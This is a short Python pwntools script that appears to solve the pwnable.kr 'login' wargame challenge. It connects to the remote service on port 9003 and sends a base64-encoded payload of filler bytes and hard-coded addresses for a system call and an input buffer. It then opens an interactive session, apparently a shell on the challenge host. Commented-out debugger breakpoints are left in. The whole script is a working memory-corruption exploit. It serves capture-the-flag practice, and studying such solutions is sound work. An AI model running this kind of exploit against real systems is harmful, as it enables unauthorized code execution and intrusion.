from pwn import *
import time

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

#p = process("./login")
p = remote("pwnable.kr", 9003)

#b *0x08049284
#b *0x08049306
#b *0x08049402
#gdb.attach(p, '''
#b *0x0804941f
#continue
#''')

system = 0x08049284
input = 0x0811eb40

#payload = "A" * 8 +"B"*4
payload = "A" * 4 + p32(system) + p32(input)
payload = b64e(payload)

p.sendline(payload)

p.interactive()
